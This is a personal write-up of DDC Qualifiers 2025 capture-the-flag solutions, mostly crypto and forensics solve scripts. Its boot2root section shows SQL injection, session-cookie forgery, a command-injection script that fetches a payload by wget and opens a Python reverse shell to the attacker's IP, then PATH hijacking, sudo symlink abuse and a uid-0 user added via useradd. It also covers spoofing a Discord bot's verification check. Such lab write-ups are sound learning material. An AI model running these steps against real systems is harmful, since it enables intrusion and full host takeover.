+++
title = "DDC Qualifiers 2025"
date = "2025-03-16"
weight = 0

[taxonomies]
tags=[
    "web", "cookie", "auth",
    "crypto", "misc",
    "boot2root", "privesc", "sqli", "setuid", "path_hijack", "command injection",
    "sudo",
    "ctf", 
]
ctf=["DDC"]
+++

I unfortunately didn't prioritize writing notes during the qualifiers, so the solutions are rather sparse in terms of details.


# Crypto


## AES Decryption

Visit the page `aes-ddc.hkn`, where theres a key and a encrypted message:

- key: `Kn0w1ngAESisP0w!`
- msg: `4y+S0gs40gNFI5ejtUh+szLf+GtzSu1IM/Lr1+2ZEWo=` (is base64 encoded)

We are given the key, so just 

```py
from Crypto.Cipher import AES
import base64

key = b'Kn0w1ngAESisP0w!'
ct = '4y+S0gs40gNFI5ejtUh+szLf+GtzSu1IM/Lr1+2ZEWo='
ct = base64.b64decode(bytes(ct,'utf-8'))

cipher = AES.new(key, AES.MODE_ECB)

plaintext = cipher.decrypt(ct)

try:
    print("The message is authentic")
    print("plaintext: ", plaintext)

except ValueError:

    print("Key incorrect or message corrupted")
```

```
The message is authentic 
plaintext: b'DDC{S3cr3t_C0d3}\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10'
```

## Binary Encodings 1

We are given a `output.txt`, looking like this:
```python
p_0 = 9768317032740503603
f_0 = 9575104083177283048
p_1 = 18156330420060477793
f_1 = 654829914826964428
p_2 = 10476762262519913959
f_2 = 8717987845758977868
p_3 = 9347882639404620023
.........................
```

We can use the *chinese remainer theorem*  to decrypt the ciphertext


I like using regex a bit too much, so I went a bit overboard, but heres the solve script

```python
import re
from sympy.ntheory.modular import solve_congruence


def binarify(m):
    in1 = int.from_bytes(m, "big")
    res = int.from_bytes(bin(in1).encode(), "big")
    return res


def debinarify(n):
    bin_str = int.to_bytes(n, (n.bit_length() + 7) // 8, "big").decode()
    original_int = int(bin_str, 2)
    return original_int.to_bytes((original_int.bit_length() + 7) // 8, "big")


data = {}

p_pat = r"p_(\d+) = (\d+)"
f_pat = r"f_(\d+) = (\d+)"

with open("output.txt", "r") as f:
    for l in f.readlines():
        p_match = re.match(p_pat, l)
        if p_match:
            p = p_match.group(1)
            p_val = int(p_match.group(2))
            index = int(p)

            if index not in data:
                data[index] = [None, None]

            data[index][0] = p_val

        f_match = re.match(f_pat, l)
        if f_match:
            f = f_match.group(1)
            f_val = f_match.group(2)
            index = int(f)

            if index not in data:
                data[index] = [None, None]

            data[index][1] = int(f_val)

data = {k: tuple(v) for k, v in data.items()}

congs = []

for key in data.keys():
    p = data[key][0]
    f = data[key][1]
    congs.append((f,p))

res = solve_congruence(*congs)

flag = debinarify(res[0]).decode()

print(f"Decrypted message: {flag}")
```

```bash
$ python chal.py
Decrypted message: DDC{crt_to_the_m0100010110001n}

```

## Long Live Caesar

This is a classic substitution cipher challenge, but with multiplication and the danish alphabet as the charset.

Looking at the ciphertext:
```
uux fwnqeefæzr bq eayr xareah
```

I can guess that `uux`=`ddc` from the comment:
```
# ddc example flag
# to
# ddc{example_flag}
```

For this case, we just have to encrypt `ddc` with every possible key (which only has length 1) until we get `uux`. Then we can decrypt it by implementing a decrypt function, that instead of using multiplication uses modulo inverse

My solve script is:

```python
import string
import random

alphabet = 'abcdefghijklmnopqrstuvwxyzæøå'

# Rotate each character by the index of the key character
def mult(a, b):
    # Ignore spaces
    if a in string.whitespace:
        return a
    return alphabet[(alphabet.index(a) * alphabet.index(b)) % len(alphabet)]

def div(a, b):
    # mod inv
    if a in string.whitespace:
        return a
    a_idx = alphabet.index(a)
    b_idx = alphabet.index(b)
    k_inv = pow(b_idx, -1, len(alphabet))
    index = a_idx * k_inv % len(alphabet)
    return alphabet[index]

def caesar_encrypt(key, text):
    ciphertext = ""
    for i in range(len(text)):
        ciphertext += mult(text[i], key)
    return ciphertext

def caesar_decrypt(key, text):
    plaintext = ""
    for i in range(len(text)):
        plaintext += div(text[i], key)
    return plaintext

key = 'a'
while (key == 'a'):
	key = random.choice(alphabet)

def main():
    # Danish text, flag is in text
    # with open('flag.txt', 'rb') as f:
    #     text = f.read().decode("utf-8").strip()
    #
    # ciphertext = caesar_encrypt(key, text)
    #
    # with open('encryption.txt', 'wb') as f:
    #     f.write(ciphertext.encode("utf-8"))

    # Once you have decrypted the ciphertext, remember to add flag formatting
    # For example:
    # ddc example flag
    # to
    # ddc{example_flag}

    with open('encryption.txt', 'rb') as f:
        text = f.read().decode("utf-8").strip()

    for a in alphabet:
        res = caesar_encrypt(a, "ddc")
        if res == "uux":
            print(f"Found {res=} with key {a}")


    plaintext = caesar_decrypt('æ', text)[4:].replace(' ', '_')

    print("DDC{" + f"{plaintext}" + "}")

if __name__ == '__main__':
    main()
```

```python
Found res='uux' with key æ
DDC{impossible_to_save_caesar}
```

## Vigeneres dictionary

We have the ciphertext:

```
vwt yblouyirkqbmo wh ckbtvmw 
```

Which have been encrypted using Vigeneres, and we are also given a wordlist. Thus my approach is just running through every one of them and finding some way to filter all possible ciphertexts down.

What we know:

- Due to the flag format we know that the first word is `ddc`, i.e. `ddc`=`vwt`.
- We know that the key is `9` long

With this we can narrow down the candidates to 6 keys.

I just took the handout code and added my brute-"filtering", as you can see further below. However


```
Amount of keys with length 9: 974
All candidates: 974
plaintext:  ddc ordbogsangreb er farlige  key: strækning
plaintext:  ddc sæølqgsapkæål er heægsie  key: strygende
plaintext:  ddc xæølqgsanpæål er fjægsie  key: stræbende
plaintext:  ddc løkodgsakdølo er cæøsvye  key: strandbar
plaintext:  ddc næølqgsalfæål er dåægsie  key: strålende
plaintext:  ddc lyekrgsagdyfk er øæymrje  key: strenghed
After filtering:  6
```

Thus the flag is: `DDC{ordbogsangreb_er_farlige}`, as it is the only one with real words

Solve script:

```python
import string

alphabet = 'abcdefghijklmnopqrstuvwxyzæøå'


# makes input lowercase, and removes all characters other than alphabet and spaces.
def clean_input(text):
    text = text.lower()
    tmp = [c if c in (alphabet + string.whitespace) else '' for c in text]
    # Remove newlines
    tmp2 = [c if c in alphabet else " " for c in tmp]
    return ''.join(tmp2)


def add(a, b):
    # ignore spaces and newlines
    if a in string.whitespace:
        return a
    # rotate character by the key character's index in the alphabet
    return alphabet[(alphabet.index(a) + alphabet.index(b)) % len(alphabet)]


def sub(a, b):
    # ignore spaces and newlines
    if a in string.whitespace:
        return a
    # rotate character by the key character's index in the alphabet
    return alphabet[(alphabet.index(a) - alphabet.index(b)) % len(alphabet)]


def vigenere_encrypt(key, text):
    ciphertext = ""
    for i in range(len(text)):
        ciphertext += add(text[i], key[i % len(key)])
    return ciphertext


def vigenere_decrypt(key, text):
    plaintext = ""
    for i in range(len(text)):
        try:
            plaintext += sub(text[i], key[i % len(key)])
        except ValueError:
            pass

    return plaintext


# Read the key from file
# with open("key.txt", "rb") as f:
#     key = f.read().decode("utf-8").strip()

# assert len(key) == 9


def main():
    # Danish text, flag is in text
    # with open('danish_text.txt', 'rb') as f:
    #     text = f.read().decode("utf-8")
    #
    # text = clean_input(text)
    # ciphertext = vigenere_encrypt(key, text)
    #
    # with open('encryption.txt', 'wb') as f:
    #     f.write(ciphertext.encode("utf-8"))

    # Once you have decrypted the ciphertext, remember to add flag formatting
    # For example:
    # ddc example flag
    # to
    # ddc{example_flag}

    ninecount = 0
    cand_ngl = []
    with open("danish_dict.txt", "rb") as f:
        for l in f:
            l = l.decode().strip()
            if len(l) != 9:
                continue
            ninecount += 1
            cand_ngl.append(l)

    print("Amount of keys with length 9:", ninecount)

    with open("encryption.txt", "rb") as f:
        ct = f.read().decode('utf-8')

    cand_res = []
    for k in cand_ngl:
        res = vigenere_decrypt(k, ct)
        cand_res.append((k,res))

    all = len(cand_res)
    filter_count = 0
    print("All candidates:", all)
    # print("Trying ddc:")
    for k,r in cand_res:
        if r[:3] == "ddc": 
            print("plaintext: ", r, "key: " + k)
            filter_count += 1

            # Extra code to filter for "er", but is not necc. when you know key len is 9
            # if r[18:20] == "er":
            #     filter_count += 1
            #     print(r, "key: " + k)

    print(filter_count)


if __name__ == '__main__':
    main()

```

# Boot2Root

## Gauntlet 1

We have a flask server on port 5000. 

There is a login page, and using this request we can do SQL injection:

```
POST /login HTTP/1.1
Host: the-gauntlet.hkn:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://the-gauntlet.hkn:5000
Connection: close
Referer: http://the-gauntlet.hkn:5000/login
Upgrade-Insecure-Requests: 1

username=*&password=*
```

Like:

```bash
└─$ sqlmap -r login.req --batch -vv --proxy http://127.0.0.1:8080 --dbms=sqlite --dump-all
```

We get the output:

```
...
5:08:51] [DEBUG] analyzing table dump for possible password hashes
Database: <current>
Table: users
[1 entry]
+----+------------------------+----------+
| id | password               | username |
+----+------------------------+----------+
| 1  | NotThePath-KeepDigging | Bob      |
+----+------------------------+----------+
```

Kinda misleading, but you can login with: `Bob:NotThePath-KeepDigging` (Or I might be wrong)

When logged in, we have a jwt token. Let's see what the claims are:

> on jwt.io (change variant cookie to "classic" to use the old page):

```json
{
  "user": {
    "is_admin": false,
    "username": "Bob"
  },
  "alg": "HS256"
}
```

change it to:

```json
{
  "user": {
    "is_admin": true,
    "username": "admin"
  },
}
```

```bash
$ flask-unsign -u --cookie eyJ1c2VyIjp7ImlzX2FkbWluIjpmYWxzZSwidXNlcm5hbWUiOiJCb2IifX0.Z8OX0Q.g-zBzl2vTGzBVp398uRsY8TYe1g --wordlist rockyou.txt --no-literal-eval
[*] Session decodes to: {'user': {'is_admin': False, 'username': 'Bob'}}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 11264 attempts
b'itsasecret'
```

Using the secret we can forge a jwt for the admin:

using flask-unsign:
```bash
flask-unsign --sign --cookie "{'user': {'is_admin': True, 'username': 'admin'}}" --secret 'itsasecret' > admin.token
````


On the page, as admin , there is a `ping` functionality, where we can do command injection

I wrote a script to identify the banned characters (I totally zoned out and overdid it):

```python
import requests
import re
import urllib
import os

supp_pref = "ping -c 1 "

url = "http://the-gauntlet.hkn:5000/admin"
jwt_admin_token = "eyJ1c2VyIjp7ImlzX2FkbWluIjp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn19.Z8O4qQ.zA7yVe1Np-twU4SjUKdK6MptNW4"

ip = "10.0.240.253"
port = 9001

illegal_chars_file = "illegal_chars.txt"

rules = {
#";": "$(echo -e \"\x3b\")",
" ": "${IFS}",
}

payloads = [
f"python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\'",
]

def bypass(text):
    for bad, sub in rules.items():
        text = text.replace(bad,sub)
    return text



headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://the-gauntlet.hkn:5000",
    "Connection": "close",
    "Referer": "http://the-gauntlet.hkn:5000/admin",
    "Cookie": f"session={jwt_admin_token}",
    "Upgrade-Insecure-Requests": "1"
}

def sendpayload(payload):
    
    payload = bypass(payload)
    print(f"bypassed payload:\n{supp_pref}{payload}")
    print()
    
    data = f"command={payload}"
    encoded_data = urllib.parse.urlencode({"command": payload})
    
    pattern = r"<pre>(.*?)</pre>"
    
    print(f"data sent:\n{encoded_data}")
    print()

    try:
        response = requests.post(url, headers=headers, data=encoded_data)
        print("Status Code:", response.status_code)
        print("Response Headers:", response.headers)
        print("Response Body:")
        print("-----------------------------\n")
        match = re.search(pattern, response.text, re.DOTALL)
        #print(response.text)
        if match:
            pre_content = match.group(1)#.strip()  # remove any extra spaces/newlines
            print(pre_content)
        else:
            if "Illegal characters detected!" in response.text:
                print("*----- illegal char!! detected -----*")
                print(f"raw payload:\n{supp_pref}{raw_p}")

    except Exception as e:
        print("An error occurred:", e)

def test_character(char):
    """
    Test a single character by sending it in a payload and checking for an 'Illegal characters detected!' response.
    """
    payload = f"127.0.0.1{char}whoami"
    encoded_data = urllib.parse.urlencode({"command": payload})

    try:
        response = requests.post(url, headers=headers, data=encoded_data)
        if "Illegal characters detected!" in response.text:
            return True
    except Exception as e:
        print(f"Error testing {char}: {e}")
    return False

# get illegal chars
# Define potential illegal characters to test
test_chars = list("!@#$%^&*(){}[]<>|;:'\"\\`")
illegal_chars = []

if os.path.exists(illegal_chars_file) and os.path.getsize(illegal_chars_file) > 0:
    with open(illegal_chars_file, "r") as f:
        illegal_chars_s= f.read().strip()
        print(f"Loaded illegal characters from file: {illegal_chars_s}")
else:
    # Test each character
    for char in test_chars:
        print(f"Testing character: {char}")
        if test_character(char):
            illegal_chars.append(char)
    
    with open(illegal_chars_file, "w") as f:
            f.write("".join(illegal_chars))


exp_file = "exp.py"

# The payload data is URL-encoded as given in the request
raw_p = f"$(wget http://{ip}:80/exp.py)"
sendpayload(raw_p)

raw_p = "$(python3 exp.py)"
sendpayload(raw_p)
print(f"raw payload:\n{supp_pref}{raw_p}")
print()
```

The illegal chars was: "&|;`"

and the reverse shell was:

```python
import os,pty,socket;s=socket.socket();s.connect(("10.0.240.253",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

Having a shell, I found the file `user.flag` in the home directory of the user

```bash
user1@0ec0352f2be2:~$ ./user.flag
Press enter within 3 seconds:
Secret flag: DDC{n0th1ng_l1k3_4_b1t_0f_RCE}`
```

## Gauntlet 2

In the first part, we used command injection to get RCE, and get a shell as `user1`

For this second part we have to traverse: `user1` -> `user2` -> `user3` -> `root`

### user2

As `user1` we see the file `testBin`, which has the sticky bit for user2:

```bash
user1@0ec0352f2be2:~$ ls -l /home/user1/testBin
-rwsrwsr-x 1 user2 user2 776520 Jan 25 20:56 /home/user1/testBin
```

Decompiling the file:

```c
undefined8 main(int param_1,undefined8 *param_2)

{
  int iVar1;
  char *local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined *local_10;
  
  if (param_1 == 2) {
    iVar1 = setuid(0x3ea);
    if (iVar1 == 0) {
      iVar1 = setgid(0x3ea);
      if (iVar1 == 0) {
        local_10 = &DAT_0047a03e;
        local_28 = "xxd";
        local_20 = param_2[1];
        local_18 = 0;
        execvp("xxd",&local_28);
        perror("execvp failed");
      }
      else {
        perror("setgid failed");
      }
    }
    else {
      perror("setuid failed");
    }
  }
  else {
    fprintf((FILE *)stderr,"Usage: %s <file>\n",*param_2);
  }
  return 1;
}
```

Notice that as `user2` we execute `xxd`. This is vulnerable to path hijacking, and we can just prepend something to the `PATH` and have that show up before the actual `xxd` binary.


```bash
user1@0ec0352f2be2:~$ mkdir -p /tmp/exploit && chmod 777 /tmp/exploit
user1@0ec0352f2be2:~$ echo -e '#include <unistd.h>\nint main() {\nsetuid(1002);\nsetgid(1002);\nexecl("/bin/bash", "bash", "-p", NULL);\n}' > /tmp/exploit/xxd.c
user1@0ec0352f2be2:~$ gcc -o /tmp/exploit/xxd /tmp/exploit/xxd.c
user1@0ec0352f2be2:~$ chmod +x /tmp/exploit/xxd
user1@0ec0352f2be2:~$ export PATH="/tmp/exploit:$PATH"
user1@0ec0352f2be2:~$ /home/user1/testBin test
bash-5.2$ id
uid=1001(user1) gid=1001(user1) euid=1002(user2) egid=1002(user2) groups=1002(user2),100(users),1001(user1)
```

And we are effectively `user2` (as the `euid=1002(user2)`).


### user3

```bash
user2@0ec0352f2be2:~$ sudo -l
Matching Defaults entries for user2 on 0ec0352f2be2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user2 may run the following commands on 0ec0352f2be2:
    (user3) NOPASSWD: /home/user2/runMe.sh`
```

We dont have write permissions to this file but we can delete it and put another file in its place!

```bash
user2@0ec0352f2be2:~$ echo '#!/bin/bash' > /tmp/exploit.sh
user2@0ec0352f2be2:~$ echo '/bin/bash -p' >> /tmp/exploit.sh
user2@0ec0352f2be2:~$ rm runMe.sh 
rm: remove write-protected regular file 'runMe.sh'? y
user2@0ec0352f2be2:~$ ln -s /tmp/exploit.sh  /home/user2/runMe.sh
user2@0ec0352f2be2:$ ls -la runMe.sh
total 36
drwxr-xr-x 1 user2 user2 4096 Mar  4 19:28 .
drwxr-xr-x 1 root  root  4096 Jan 25 20:57 ..
-rw------- 1 user2 user2  906 Mar  4 19:19 .bash_history
-rw-r--r-- 1 user2 user2  220 Jan 25 20:57 .bash_logout
-rw-r--r-- 1 user2 user2 3771 Jan 25 20:57 .bashrc
drwx------ 2 user2 user2 4096 Mar  4 19:19 .cache
-rw-r--r-- 1 user2 user2  807 Jan 25 20:57 .profile
drwxrwxr-x 2 user2 user2 4096 Mar  4 19:18 .ssh
lrwxrwxrwx 1 user2 user2   15 Mar  4 19:28 runMe.sh -> /tmp/exploit.sh
user2@0ec0352f2be2:~$ chmod +x runMe.sh 
user2@0ec0352f2be2:~$ sudo -u user3 /home/user2/runMe.sh
user3@0ec0352f2be2:/home/user2$ ls
runMe.sh
```

### root

The final step is not really a exploit. Its just adding a new "root" user.

As you can see we can execute the `useradd` binary as root:

```bash
user3@0ec0352f2be2:~$ sudo -l
Matching Defaults entries for user3 on 0ec0352f2be2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User user3 may run the following commands on 0ec0352f2be2:
    (root) NOPASSWD: /usr/sbin/useradd *
```

We can add ad new user with the `uid` of 0 like this:

```bash
user3@0ec0352f2be2:~$ sudo -u root /usr/sbin/useradd smavles -p $(openssl passwd -1 kajmand) --uid 0 -o -s /bin/bash
useradd warning: smavles's uid 0 outside of the UID_MIN 1000 and UID_MAX 60000 range.
```

```bash
user3@0ec0352f2be2:~$ cat /etc/passwd | grep smavles
smavles:x:0:1007::/home/smavles:/bin/bash
user3@0ec0352f2be2:~$ su smavles
Password: 
root@0ec0352f2be2:/home/user3# cd /root
root@0ec0352f2be2:/root# ls
entrypoint.sh  root.flag
root@0ec0352f2be2:/root# ./root.flag 
Press enter within 3 seconds: 
Secret flag: DDC{1_h0p3_y0u_enj0y3d_my_f1r27_B2R}
```


# Misc 

## DDC admin bot

**TLDR**
1. User **kaj** sends `!verifyme` 
2. Bot sends message in `verification_channel`: `f"{user.mention} has requested verification. Moderators with {mod_role.mention}, please verify."`
4. User with moderator role reacts with ✅ on message
5. Do Exploit
    - send spoof message in own discord server 
    - react to it while having the the role `moderator`
6. User **kaj** is assigned role `member`
7. Read flag in new channel on the real server

**Details:**

In this challenge we have to exploit a Discord bot. There is an instance of the bot running on the challenge Discord server. 

When a user types `!verifyme` then the bot sends the message: 
```py
msg = f"{user.mention} has requested verification. Moderators with {mod_role.mention}, please verify."
``` 
to the "verification channel".

Our goal is to have a user, with the `mod_role`, react with to the message sent by the bot, but we do not have access to this channel nor do we have the `mod_role`

However, the bot has a vulnerability!

The important part is the `check` function in:

```python
    try:
        # Wait for a moderator to react with the correct emoji
        reaction, moderator = await bot.wait_for('reaction_add', check=check)
        # Assign the "member" role to the user after verification
        member_role = discord.utils.get(guild.roles, name=MEMBER_ROLE_NAME)
        if member_role is None:
            await ctx.send("Member role not found in the server.")
        else:
            await user.add_roles(member_role)
            await verification_channel.send(
                f"{user.mention} has been verified by {moderator.mention} and given the {member_role.name} role."
            )
    <...>
``` 
Notice the conditions:
```python
    def check(reaction, reactor):
        return (
            str(reaction.emoji) == "✅"
            and reaction.message.content == msg
            and reaction.message.channel.name == VERIFICATION_CHANNEL_NAME
            and any([r.name == MODERATOR_ROLE_NAME for r in reactor.roles])
        )
 ``` 

Since the constants just are strings, e.g:

```python
MODERATOR_ROLE_NAME = "moderator"
MEMBER_ROLE_NAME = "member"
VERIFICATION_CHANNEL_NAME = "verification" 
```

We can spoof the message by adding the bot to our own discord server (denoted `fake server`)

The setup is:

- Create a second Discord server `fake server`
- Invite the same "instance" of the Discord bot to the `fake server` using this method: https://ctftime.org/writeup/33674

(Additionally I spun up the docker image to easier debug the values of the varaibles)

<!--```python-->
<!--    def check(reaction, reactor):-->
<!--        print("ENTERING check")-->
<!--        print(f"reaction emoji:{str(reaction.emoji)}, {reaction.message.content == msg}, {reaction.message.channel.name == VERIFICATION_CHANNEL_NAME}, {any([r.name == MODERATOR_ROLE_NAME for r in reactor.roles])}")-->
<!--        if str(reaction.emoji) != "✅":-->
<!--            print("Wrong:")-->
<!--            print(str(reaction.emoji))-->
<!--        if reaction.message.content != msg:-->
<!--            print("Wrong:")-->
<!--            print(f"rmsg:{reaction.message.content}")-->
<!--            print(f"msg: {msg}")-->
<!--        if (any([r.name == MODERATOR_ROLE_NAME for r in reactor.roles])):-->
<!--            print("Wrong:")-->
<!--            print("reactor.roles", reactor.roles)-->
<!--        return (-->
<!--            str(reaction.emoji) == "✅"-->
<!--            and reaction.message.content == msg-->
<!--            and reaction.message.channel.name == VERIFICATION_CHANNEL_NAME-->
<!--            and any([r.name == MODERATOR_ROLE_NAME for r in reactor.roles])-->
<!--        )-->
<!---->
<!--```-->

Start by sending a real `!verifyme` in the real discord server.

Then to spoof the reaction you need some IDs (enable developer mode in Discord)

- Your User ID. (right-click yourself or something)
- Find user with the `moderator` role and get the Role ID (right-click)
    - `1293636473291014184`

To construct the message:

Send `!verifyme` in the fake server to get:
```
<@USER_ID> has requested verification. Moderators with <@&FAKE_MODERATOR_ROLE_ID>, please verify.
```
Then replace role id with id from real serve and send this message in fake server:

```
<@SMAVL_ID> has requested verification. Moderators with <@&1293636473291014184>, please verify.
```
then react to the message with ✅, and you should get the `member` role in the challenge server (in the fake server make and give ourself the role of `moderator`)

## Masahiro Hara 

We are given this almost minecraft-steve looking picture, that is some part of a QR-code.


![xx](/imgs/ctf/ddc_q_25/flag.png)

I tried different things: solvers, python pillow (and others), but I couldn't easily get it to work. I ended up resorting to installing [ MOBZystems - See Through Windows](https://www.mobzystems.com/tools/seethroughwindows/) overlaying the image over a site where could manually input the dots. 

This was how it looked ![overlayed](/imgs/ctf/ddc_q_25/clickthroughandstuff.png)  

And exported it to to be this 

![final](/imgs/ctf/ddc_q_25/finito.png)  


Scan it (I promise it is not a rickroll)


# pwn 

## gotowin

wip

## uwu1

wip

# Web 

## Complete Styling Sadness
WIP
## Cross Site Job
WIP
## Leaky Store
WIP

# Reversing

## OutXORING
WIP

## PassProtector
WIP

# Forensics

## Shutter trace
```
$ grep -ri "" Clue_Folder/
Clue_Folder/Not_this_one_8.txt:Sample content for Clue_Folder file 8
Clue_Folder/Not_this_one_8.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_8.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_5.txt:Sample content for Clue_Folder file 5
Clue_Folder/Not_this_one_5.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_5.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_6.txt:Sample content for Clue_Folder file 6
Clue_Folder/Not_this_one_6.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_6.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_2.txt:Sample content for Clue_Folder file 2
Clue_Folder/Not_this_one_2.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_2.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_7.txt:Sample content for Clue_Folder file 7
Clue_Folder/Not_this_one_7.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_7.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_4.txt:Sample content for Clue_Folder file 4
Clue_Folder/Not_this_one_4.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_4.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_1.txt:Sample content for Clue_Folder file 1
Clue_Folder/Not_this_one_1.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_1.txt:Additional notes or placeholders for data.
Clue_Folder/Not_this_one_3.txt:Sample content for Clue_Folder file 3
Clue_Folder/Not_this_one_3.txt:Details of the case, incident, or evidence.
Clue_Folder/Not_this_one_3.txt:Additional notes or placeholders for data.
Clue_Folder/.clue.txt:VGhlIHBob3RvIGlzIGhpZGRlbiBpbiB0aGUgRXZpZGVuY2UgRm9sZGVyIGFzIGEganBnIGZpbGU=
```
```bash
$ grep -ri "" Clue_Folder/ | tail -n -1 | sed 's/.*://g' | base64 -d
The photo is hidden in the Evidence Folder as a jpg file
```


```bash
$ find -name *.jpg
./Evidence_Folder/super-market-8494759_1280.jpg
```

```bash
$ strings $(find -name *.jpg) | grep DDC
    <rdf:li>DDC{D4n13lss3n}</rdf:li>
```

## Ping Sweep 

I have to find something that is different about some subset of packets. By sheer willpower I found that a small number of packets had something called *ECN*. Using tshark i found 4 different parts of the flag.

```
PART_1:DDC{hv:PARTEND
PART_2:ad_fae:PARTEND
PART_3:n_er_E:PARTEND
PART_4:CN}:PARTEND

DDC{hvad_faen_er_ECN}
```

## The Professors Lost Note

I must find `hint.txt` and read the contents

```bash
$ find . | grep "hint.txt"
./Professor_Notes/.hint.txt
$ cat $(find . | grep "hint.txt"); echo
DDC{3x4m4n5w3r5}
```

## Efterforskningen

We are given an img file

```bash
$ strings Efterforskningen.img | grep DDC | tail -n -1
echo "DDC{just_go_away}" > secret.txt
```


